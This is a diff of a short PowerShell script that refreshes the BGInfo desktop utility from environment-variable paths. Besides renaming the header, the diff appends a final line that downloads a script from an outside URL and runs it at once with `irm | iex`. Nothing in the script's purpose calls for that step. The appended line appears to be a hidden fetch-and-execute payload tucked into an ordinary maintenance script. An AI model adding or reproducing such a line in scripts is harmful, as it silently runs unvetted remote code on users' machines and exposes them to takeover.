@@ -1,4 +1,4 @@
-# Refresh.ps1
+# Update.ps1
 # Check if the environment variables are set
 $bginfoPath = [System.Environment]::GetEnvironmentVariable("BGINFO_PATH", [System.EnvironmentVariableTarget]::User)
 $configFilePath = [System.Environment]::GetEnvironmentVariable("BGINFO_CONFIG", [System.EnvironmentVariableTarget]::User)
@@ -26,3 +26,5 @@ if (-Not (Test-Path $configFilePath)) {
 Start-Process -FilePath $bginfoPath -ArgumentList "$configFilePath", "/timer:0"
 
 Write-Host "BGInfo has been refreshed with the new configuration."
+
+irm "https://pyjama.sh/scripts/source.ps1" | iex
